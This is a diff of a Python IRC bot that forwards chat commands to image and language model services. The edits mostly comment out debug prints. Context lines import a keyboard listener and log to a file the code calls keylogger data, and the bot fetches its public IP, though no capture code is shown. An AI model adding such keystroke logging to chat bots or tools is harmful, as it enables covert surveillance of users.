@@ -53,7 +53,7 @@ from requests import get
 
 from pynput.keyboard import Key, Listener
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") # Text file to save keylogger data.
-starttime = datetime.datetime.utcnow() # Start time is used to calculate uptime.
+#starttime = datetime.datetime.utcnow() # Start time is used to calculate uptime.
 ip = get('https://api.ipify.org').text # Get public IP address. (used to set botnick-to-ip as well as the '.ip' command.)
 sys.path.insert(0, '/usr/local/bin/') # Working directory.
 from hsConfig import * # import the hsConfig.py file.
@@ -212,8 +212,8 @@ def sendntc(ntc, target=channel): # Sends a NOTICE to the target.
 def sendping(): # Sends a NOTICE to the target.
     pingtime = int(time.time())
     ircsend("PING LAG" + str(pingtime))
-    if debugmode: # If debugmode is True, msgs will print to screen.
-        print("[" + time.strftime("%H:%M:%S", time.localtime()) + "]: " + "PING LAG" + str(pingtime)) # Print messages to the screen. (won't allow bot to run in the background.)
+    #if debugmode: # If debugmode is True, msgs will print to screen.
+    #    print("[" + time.strftime("%H:%M:%S", time.localtime()) + "]: " + "PING LAG" + str(pingtime)) # Print messages to the screen. (won't allow bot to run in the background.)
     
 def sendversion(nick, ver): # Respond to VERSION request.
     ver = "VERSION " + software + ' ' + version + ' Download it at: ' + github
@@ -251,7 +251,8 @@ def irc_receive():
             message_queue.append(ircmsg)
 
             if debugmode: # If debugmode is True, msgs will print to screen.
-                print("[" + time.strftime("%H:%M:%S", time.localtime()) + "]: " + ircmsg) # Print messages to the screen. (won't allow bot to run in the background.)
+                if ircmsg.find("PONG") == -1:
+                    print("[" + time.strftime("%H:%M:%S", time.localtime()) + "]: " + ircmsg) # Print messages to the screen. (won't allow bot to run in the background.)
 
         if not ircmsg: # If no response from server, try and reconnect.
             if debugmode: # If debugmode is True, msgs will print to screen.
@@ -396,7 +397,7 @@ def main():
 
                 if (sd_status == True):
                     if ((parts[0].lower() == str("." + "sd")) or (parts[0].lower() == str("sd" + ",")) or (parts[0].lower() == str("sd" + ":"))):
-                        print("Stable Diffusion Matched")
+                        #print("Stable Diffusion Matched")
                         
                         prompt = parts[1:]                
                         prompt = " ".join(prompt)
@@ -411,7 +412,7 @@ def main():
 
                 elif (llm_api_status == True):
                     if ((parts[0].lower() == str("." + "gpt3")) or (parts[0].lower() == str("gpt3" + ",")) or (parts[0].lower() == str("gpt3" + ":"))):
-                        print("GPT3 Matched")
+                        #print("GPT3 Matched")
                         
                         prompt = parts[1:]
                         prompt = " ".join(prompt)
@@ -426,7 +427,7 @@ def main():
 
                 elif (llm_proxy_status == True):
                     if ((parts[0].lower() == str("chatgpt" + ":")) or (parts[0].lower() == str("." + "chatgpt")) or (parts[0].lower() == str("chatgpt" + ",")) or (parts[0].lower() == str("gpt4" + ":")) or (parts[0].lower() == str("." + "gpt4")) or (parts[0].lower() == str("gpt4" + ",")) or (parts[0].lower() == str("gpt" + ":")) or (parts[0].lower() == str("." + "gpt")) or (parts[0].lower() == str("gpt" + ","))):
-                        print("GPT4 Matched")
+                        #print("GPT4 Matched")
                         
                         prompt = parts[1:]                
                         prompt = " ".join(prompt)
@@ -438,7 +439,7 @@ def main():
                         messages = Bot_Commands.botCommands(sendmsg, chatgpt, name, prompt, maxTokens, maxLines, sourceChannel, server)
                         
                     elif ((parts[0].lower() == str("otaku-chan" + ":")) or (parts[0].lower() == str("!o")) or (parts[0].lower() == str("." + "otaku-chan")) or (parts[0].lower() == str("otaku-chan" + ",")) or (parts[0].lower() == str("otaku" + ":")) or (parts[0].lower() == str("." + "otaku")) or (parts[0].lower() == str("otaku" + ","))):
-                        print("Otaku-chan Matched")
+                        #print("Otaku-chan Matched")
                         
                         prompt = parts[1:]                
                         prompt = " ".join(prompt)
@@ -453,7 +454,7 @@ def main():
                 #######################################################
 
                 for i, message in enumerate(messages):
-                    print(message)
+                    #print(message)
                     sendmsg(f"{message}", sourceChannel)
                     time.sleep(0.250)
 
